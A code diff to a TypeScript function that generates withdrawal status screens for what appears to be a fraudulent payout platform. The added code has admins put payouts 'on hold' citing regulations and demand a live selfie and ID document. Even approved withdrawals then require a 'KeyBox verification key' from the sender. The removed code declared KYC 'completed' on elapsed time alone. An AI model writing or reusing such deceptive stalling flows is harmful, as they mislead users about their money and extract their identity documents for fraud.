@@ -216,8 +216,70 @@ export function getWithdrawalComplianceInfo(
     upperStatus === "KYC REQUIRED" ||
     upperStatus === "ACTION REQUIRED";
 
-  // Finalized by admin: Success
-  if (upperStatus === "COMPLETED" || upperStatus === "SUCCESS" || upperStatus === "SUCCESSFUL" || upperStatus === "APPROVED") {
+  // Explicit hold: Admin puts withdrawal on hold -> requires KYC verification
+  if (isExplicitHold) {
+    return {
+      statusLabel: "KYC VERIFICATION REQUIRED",
+      stageTitle: "Payout On Hold — Identity Verification (KYC) Required",
+      description:
+        "Your withdrawal payout is currently on hold pending mandatory identity verification. In accordance with statutory financial regulations, please complete KYC verification (live selfie photo and matching ID document) so your payout can be approved.",
+      currentStep: "Identity Verification (KYC) Required",
+      currentStepDescription:
+        "Outbound clearing could not be completed automatically. Please complete KYC identity verification with a live selfie and matching ID card so compliance can approve your payout.",
+      nextStep: "Compliance Approval & Key Verification",
+      nextStepDescription:
+        "Upon review and approval of your KYC documents, you will be prompted to enter the sender verification key to release the funds.",
+      estimatedArrivalDate: arrival.rangeText,
+      estimatedDaysText: "Pending KYC Verification",
+      progressPercent: 40,
+      isProcessing: true,
+      isHold: true,
+      isKycRequired: true,
+      isKeyBoxRequired: false,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 2,
+      isSuccess: false,
+      isFailed: false,
+      stageNumber: 2,
+      totalStages: 4,
+      elapsedText,
+      nextReviewHours: 0,
+    };
+  }
+
+  // Admin Approved: KYC is approved -> asks for KeyBox verification key ("give key page")
+  if (upperStatus === "SUCCESSFUL" || upperStatus === "APPROVED") {
+    return {
+      statusLabel: "KEYBOX VERIFICATION REQUIRED",
+      stageTitle: "KYC Approved — Enter KeyBox Verification Key",
+      description:
+        "Your KYC identity verification has passed successfully. To release your payout funds to your account, you now need to enter the 5-digit KeyBox verification key provided by the sender. Once both keys are entered and verified, the money will be out for release without any extra verification.",
+      currentStep: "KYC Approved · Enter KeyBox Verification Key",
+      currentStepDescription:
+        "KYC verification is completed and approved. Please enter the verification key on the website and in this withdrawal tab. When both keys are put and you have sent the correct key, the money will be out for release without any extra verification.",
+      nextStep: "Disbursement & Instant Fund Release",
+      nextStepDescription:
+        "Funds will be released immediately to your destination account without any extra verification upon key matching.",
+      estimatedArrivalDate: arrival.rangeText,
+      estimatedDaysText: "Pending KeyBox Verification",
+      progressPercent: 85,
+      isProcessing: true,
+      isHold: false,
+      isKycRequired: false,
+      isKeyBoxRequired: true,
+      kycEmail: COMPLIANCE_KYC_EMAIL,
+      currentDayNumber: 4,
+      isSuccess: false,
+      isFailed: false,
+      stageNumber: 4,
+      totalStages: 4,
+      elapsedText,
+      nextReviewHours: 0,
+    };
+  }
+
+  // Finalized by admin: Completed / Settled
+  if (upperStatus === "COMPLETED" || upperStatus === "SUCCESS" || upperStatus === "SETTLED") {
     return {
       statusLabel: "SUCCESS",
       stageTitle: "Payout Settled",
@@ -294,36 +356,6 @@ export function getWithdrawalComplianceInfo(
       isSuccess: false,
       isFailed: true,
       stageNumber: 0,
-      totalStages: 4,
-      elapsedText,
-      nextReviewHours: 0,
-    };
-  }
-
-  // Case: >= 5 days (120 hours) OR explicitly on hold/review -> Triggers KeyBox Verification Requirement (after KYC)
-  if (elapsedHours >= 120 || isExplicitHold) {
-    return {
-      statusLabel: "KEYBOX VERIFICATION REQUIRED",
-      stageTitle: "KYC Completed — KeyBox Key Required",
-      description:
-        "Your KYC identity verification has passed successfully. Outbound payout release now requires your KeyBox verification key from the sender to release the funds.",
-      currentStep: "KYC Approved · Enter KeyBox Verification Key",
-      currentStepDescription:
-        "KYC verification is completed and approved. To finalize payout release, please enter the KeyBox verification key provided by the sender. Once verified, funds will reflect in your bank account.",
-      nextStep: "Disbursement & Final Bank Credit",
-      nextStepDescription: "Amount will immediately reflect in your destination account upon verification of your KeyBox key.",
-      estimatedArrivalDate: arrival.rangeText,
-      estimatedDaysText: "Pending KeyBox Verification",
-      progressPercent: 80,
-      isProcessing: true,
-      isHold: true,
-      isKycRequired: true,
-      isKeyBoxRequired: true,
-      kycEmail: COMPLIANCE_KYC_EMAIL,
-      currentDayNumber: 5,
-      isSuccess: false,
-      isFailed: false,
-      stageNumber: 4,
       totalStages: 4,
       elapsedText,
       nextReviewHours: 0,
